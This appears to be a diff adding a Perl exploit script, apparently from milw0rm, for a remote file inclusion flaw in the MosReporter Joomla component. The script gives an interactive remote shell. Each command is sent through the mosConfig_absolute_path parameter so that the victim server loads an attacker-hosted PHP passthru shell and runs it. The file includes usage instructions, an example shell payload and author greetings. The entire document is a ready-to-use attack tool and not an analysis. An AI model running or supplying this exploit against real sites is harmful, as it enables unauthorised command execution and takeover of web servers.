@@ -1,0 +1,89 @@
+#!/usr/bin/perl
+########################################################################################################
+# MosReporter Joomla Component Remote  File Inclusion Exploit
+########################################################################################################
+# Download Script http://mamboxchange.com/tracker/download.php/196/805/1010/119/reporter_mambelfish.zip
+########################################################################################################
+# Bug Found & coded By Crackers_Child
+#########################################################################################################
+# crackers_child@sibersavascilar.com
+#########################################################################################################
+# Kullanimi
+# perl cra.pl <target> <cmd shell location> <cmd shell variable>
+#
+# perl cra http://site.com/ http://site.com/cmd.txt cmd
+#
+# cmd shell example: <?passthru($_GET[cmd]);?>
+#
+# cmd shell variable: ($_GET[cmd]);
+##
+# #
+#Greetz: X_Alperen_X aND All SiberSavascilar.CoM Users !
+#
+# Contact: crackers_child@sibersavascilar.com
+##
+
+use LWP::UserAgent;
+
+$Path = $ARGV[0];
+$Pathtocmd = $ARGV[1];
+$cmdv = $ARGV[2];
+
+if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
+
+head();
+
+while()
+{
+      print "[shell] \$";
+while(<STDIN>)
+      {
+              $cmd=$_;
+              chomp($cmd);
+
+$xpl = LWP::UserAgent->new() or die;
+$req = HTTP::Request->new(GET =>$Path.'components/com_reporter/reporter.logic.php?mosConfig_absolute_path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
+
+$res = $xpl->request($req);
+$return = $res->content;
+$return =~ tr/[\n]/[....]/;
+
+if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
+
+elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
+      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
+elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
+
+if($return =~ /(.*)/)
+
+
+{
+      $finreturn = $1;
+      $finreturn=~ tr/[....]/[\n]/;
+      print "\r\n$finreturn\n\r";
+      last;
+}
+
+else {print "[shell] \$";}}}last;
+
+sub head()
+ {
+ print "\n============================================================================\r\n";
+ print " *MosReporter Joomla Component Remote  File Inclusion Exploit*\r\n";
+ print "============================================================================\r\n";
+ }
+sub usage()
+ {
+ head();
+ print " Usage: perl cra <target> <cmd shell location> <cmd shell variable>\r\n\n";
+ print " <Site> - Full path to example: http://www.site.com/ \r\n";
+ print " <cmd shell> - Path to cmd Shell e.g http://sibersavascilar.com/rst.txt? \r\n";
+ print " <cmd variable> - Command variable used in php shell \r\n";
+ print "============================================================================\r\n";
+ print "                             By Crackers_Child \r\n";
+ print "                   crackers_child(at)sibersavascilar(dot)com \r\n";
+ print "============================================================================\r\n";
+ exit();
+ }
+
+# milw0rm.com [2006-11-17]
